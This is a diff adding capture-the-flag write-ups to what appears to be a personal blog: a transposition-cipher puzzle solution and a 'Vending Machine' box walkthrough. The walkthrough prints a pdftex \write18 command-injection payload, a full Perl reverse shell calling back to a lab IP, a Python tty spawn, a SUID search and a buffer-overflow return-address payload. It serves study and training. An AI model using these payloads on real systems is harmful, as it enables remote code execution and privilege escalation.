@@ -40,7 +40,7 @@ Now we can SSH into the machine with username mrflibble and password midnight.
 
 - You should limit the amount of password attempts before a lockout.
 
-![Rarityhappy](/SiteImages/tumblr_m4aapqcT8O1r3k1m8o6_500.png)
+
 
 To get root, I used the `sudo -l` command to see what things I can run with elevated privileges...
 
@@ -190,4 +190,117 @@ Make these files in my _/home/starbug_ directory and backup to _/home/starbug_..
 execute _backup_ aaaaannnnnnddddd
 Drops root shell! Get root flag :)
 
+![Rarityhappy](/SiteImages/tumblr_m4aapqcT8O1r3k1m8o6_500.png)
+
 ## Intercept: 
+This is a cipher challenge. At the start, we are presented with the following coded message:
+
+![code](/SiteImages/CTFpics/InterceptCode.png)
+
+Putting through hex decoder, get a code where I can recognise a few words but the letters are mixed up:
+
+`V/NIADOL/OMSGEO FFK YROT NOY UIGBMIO!D//ffeeffc/486acd//aae/95ffeeff00///!/} /IGBMIO/Da55baab9/2 /OY/U7e1e7f/0 /RKTYNO9/d6f6/2 /FO/F/{S/EM/GUCHEV/NIADOL
+O`
+
+Putting through transposition cipher decoder we get this:
+
+`/VINDALOO/SMEG_OFF_KRYTON_YOU_GIMBOID!//FFEEFF/C84A6DC//AA/E59FFEEFF00//!/}//_GIMBOID/5AB5AA9B2//_YOU/E7E1F70//_KRYTON/96D6F2//_OFF/{//SMEG/CUEH/VINDALOO_`
+
+Seems like the letters are in order now but the words are out of order... what if a single slash (/) means same as or in the same position and double slash (//) is a separator...
+
+For example,  _SMEG/CUEH_ means that _CUEH_ is in the same position as _SMEG_ in the sequence _SMEG_OFF_KRYTON_YOU_GIMBOID!_
+
+Therefore the flag is:
+
+`CUEH{ 96D6F2 E7E1F70 5AB5AA9B2}`
+
+This is a little short... something is missing.
+Replace _AA_ with  _E59FFEEFF00_ since  _AA/E59FFEEFF00_
+So then `CUEH{96D6F2 E7E1F70 5AB5E59FFEEFF009B2}`
+Replace _FFEEFF_ with  _C84A6DC_ since  _FFEEFF/C84A6DC_
+Therefore flag is `CUEH{96D6F2E7E1F705AB5E59C84A6DC009B2}`
+The challenge that was the least points took me the longest to complete... funny that.
+
+- Ciphers are fun!
+
+## Vending Machine:
+This one allows you to input data into a pdf document... perhaps there is a way to get the commands we insert to execute. Open generated pdf in hex editor, see that html to pdf converter it uses:
+
+![pdfhex](/SiteImages/CTFpics/VendingMachineHex.png)
+
+Looks like it uses _pdftex_... have to insert commands in top input box since input in bottom box is sanitised.
+
+`\immediate\write18{ls|base64 > test.txt} \newread\file \openin\file=test.txt \loop\unless\ifeof\file     \read\file to\fileline     \text{\fileline} \repeat \closein\file `
+
+Using this command runs the _ls_ command and encodes it in base 64.
+
+![errorvending](/SiteImages/CTFpics/VnedingMachineError.png)
+
+View the pdf through this error at the bottom of the page and:
+
+![b64](/SiteImages/CTFpics/VnedingMachineB64.png)
+
+Decoding from base 64 we can see that this worked! We get the listing of files in the current directory.
+
+![b64d](/SiteImages/CTFpics/VnedingMachineB64Dcode.png)
+
+Use this info to drop a reverse shell in the same way... use perl reverse shell in place of ls command.
+
+`\immediate\write18{perl -e 'use Socket;$i="192.168.42.5";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'|base64 > test.txt} \newread\file \openin\file=test.txt \loop\unless\ifeof\file     \read\file to\fileline     \text{\fileline} \repeat \closein\file`
+
+Get a shell drop as _www-data_!
+User.txt in _chocolate_ directory... `sudo -l` says we can run python as chocolate user, use this to drop a shell as chocolate and read _user.txt_!
+
+![vendingsudo](/SiteImages/CTFpics/VendingMachineSudo.png)
+
+Very nice! Now lets get root baby.
+Since I need one or I cant do much else, spawn a tty with python:
+`python -c “import pty; pty.spawn('/bin/sh')”`
+
+![vendingterm](/SiteImages/CTFpics/VendingMachineTerminal.png)
+
+Cant use sudo command as chocolate without password...
+
+Search for SUID files → `find / -perm /4000`
+
+there is a binary in _/bin/_ called _BOF1_... perhaps buffer overflow is involved?
+
+![bofpass](/SiteImages/CTFpics/VnedingMachineBinRun.png)
+
+This program asks for a password but the password is randomized each time. After we enter enough A's we get a seg fault which means buffer overflow is possible!
+
+Copy program to local machine by encoding to base 64 and decoding.
+
+With enough A's entered we get:
+
+![bofseg](/SiteImages/CTFpics/VendingMachineBOF.png)
+
+After 40 A's entered we get a sensible address, 0x0804000a in ?? ()
+Therefore, I think the buffer has a size of 40...
+
+`objdump -d` on _BOF1 binary_, login success function at *0x08049216*
+In little endian this is:
+*\x16\x92\x04\x08*
+
+`python -c "print 'A' * 40 + '\x16\x92\x04\x08'" | ./BOF1`
+This prints 40 A's then adds the address of the login success function to the end. 
+This gives us the access granted message!
+
+![bofgranted](/SiteImages/CTFpics/VendingMachineAccessGrant.png)
+
+No shell is dropped though... program closes straight after.
+Use python2 to write the output to evil.txt file 
+
+![bofevil](/SiteImages/CTFpics/VendingMachineEviltxt.png)
+
+Then use cat to pipe the contents of _evil.txt_ into the binary and the shell stays open this time!
+
+Use – with cat to pipe stdinput into the binary.
+
+![bofroot](/SiteImages/CTFpics/VendingMachineRoot.png)
+
+And we got root!!! Wow, my first buffer overflow :)
+
+![partycannon](/SiteImages/partycannon.png)
+
+## Marking Time:
